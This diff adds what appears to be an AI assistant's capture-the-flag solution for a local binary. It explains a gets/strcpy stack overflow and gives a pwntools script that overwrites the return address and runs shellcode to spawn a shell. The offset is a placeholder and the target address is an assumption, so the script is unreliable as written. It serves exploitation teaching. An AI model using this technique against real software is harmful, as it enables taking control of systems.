@@ -1,0 +1,80 @@
+To solve this challenge using `pwntools`, we need to exploit the `check` function, which has a buffer overflow vulnerability in the `strcpy` call. The `validate_passwd` function reads user input using `gets`, which is also vulnerable to buffer overflow. We can leverage these vulnerabilities to gain control over the program's execution flow.
+
+Here are the steps to solve the challenge:
+
+1. **Understand the Vulnerability**:
+   - The `validate_passwd` function reads user input into a buffer `s` of size 50 using `gets`, which does not check the length of the input.
+   - The `check` function then copies this input into another buffer `passwd_buf` using `strcpy`, which also does not check the length of the input.
+   - This allows us to overflow the buffer and overwrite the return address of the `validate_passwd` function.
+
+2. **Find the Offset**:
+   - We need to determine the exact offset at which the return address is overwritten. This can be done using a pattern create and pattern offset tool or by trial and error.
+
+3. **Craft the Payload**:
+   - We will craft a payload that overwrites the return address with the address of a gadget or shellcode.
+
+4. **Exploit the Vulnerability**:
+   - Use `pwntools` to send the crafted payload to the program and gain control over the execution flow.
+
+Here is the step-by-step code to solve the challenge:
+
+```python
+from pwn import *
+
+# Set up the process
+binary_path = './int'
+elf = ELF(binary_path)
+p = process(binary_path)
+
+# Find the offset
+offset = cyclic_find(0x6161616a)  # Replace with the actual offset found
+
+# Find the address of the shellcode or a gadget
+# For simplicity, let's assume we have a gadget to jump to a shellcode
+# You can use ROPgadget, objdump, or other tools to find gadgets
+shellcode = asm(shellcraft.sh())  # Generate a simple shellcode to spawn a shell
+
+# Find the address of the buffer
+buffer_addr = elf.symbols['passwd_buf']
+
+# Craft the payload
+payload = b'A' * offset
+payload += p32(buffer_addr)  # Overwrite the return address with the buffer address
+payload += shellcode
+
+# Send the payload
+p.sendline(payload)
+
+# Interact with the shell
+p.interactive()
+```
+
+### Explanation:
+
+1. **Set up the process**:
+   - `binary_path` is the path to the binary.
+   - `elf` is an object representing the binary.
+   - `p` is the process object for the binary.
+
+2. **Find the offset**:
+   - `cyclic_find` is used to find the offset where the return address is overwritten. Replace `0x6161616a` with the actual value found using `pattern_create` and `pattern_offset`.
+
+3. **Find the address of the shellcode or a gadget**:
+   - `shellcode` is generated using `shellcraft.sh()`, which creates a simple shellcode to spawn a shell.
+   - `buffer_addr` is the address of the `passwd_buf` buffer.
+
+4. **Craft the payload**:
+   - `payload` is constructed with `A` characters to fill the buffer up to the offset.
+   - The return address is overwritten with the address of the buffer.
+   - The shellcode is appended to the payload.
+
+5. **Send the payload**:
+   - `p.sendline(payload)` sends the payload to the binary.
+   - `p.interactive()` allows interaction with the shell spawned by the shellcode.
+
+### Notes:
+- Ensure that ASLR (Address Space Layout Randomization) is disabled or bypassed if it is enabled.
+- You may need to adjust the offset and addresses based on the specific environment and binary.
+- Use tools like `gdb` and `pwntools` to debug and refine the exploit.
+
+This should help you solve the challenge and gain a shell. Good luck!
